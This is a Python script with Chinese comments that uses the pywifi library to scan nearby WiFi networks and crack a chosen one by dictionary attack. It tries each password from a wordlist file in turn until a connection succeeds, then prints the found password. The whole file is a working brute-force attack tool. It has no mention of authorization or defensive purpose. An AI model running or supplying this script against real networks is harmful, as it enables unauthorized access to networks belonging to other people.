import pywifi
import time

def scan_wifi(iface):
    # 扫描附近的 WiFi 网络
    iface.scan()
    time.sleep(2)  # 休眠一段时间等待扫描结果
    scan_results = iface.scan_results()
    return [result.ssid for result in scan_results]

def crack_wifi(iface, ssid, password_file):
    # 从密码文件中尝试破解 WiFi 密码
    with open(password_file, 'r') as file:
        for line in file:
            password = line.strip()
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.key = password
            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)
            iface.connect(tmp_profile)
            time.sleep(2)
            if iface.status() == pywifi.const.IFACE_CONNECTED:
                print(f"Success! Password found: {password}")
                return True
        print("Failed! Password not found.")
        return False

def main():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    # 显示附近的 WiFi 网络列表
    print("Available WiFi networks:")
    networks = scan_wifi(iface)
    for idx, network in enumerate(networks, start=1):
        print(f"{idx}. {network}")

    # 用户选择要破解的 WiFi 网络
    selected_index = int(input("Enter the index of the WiFi network to crack: ")) - 1
    selected_ssid = networks[selected_index]

    # 用户提供包含密码的文件路径
    password_file = input("Enter the path to the password file: ")

    # 开始尝试破解 WiFi 密码
    print(f"Cracking WiFi network '{selected_ssid}'...")
    success = crack_wifi(iface, selected_ssid, password_file)

    # 输出破解结果
    if success:
        print("WiFi password successfully cracked.")
    else:
        print("WiFi password not found in the provided password list.")

if __name__ == "__main__":
    main()
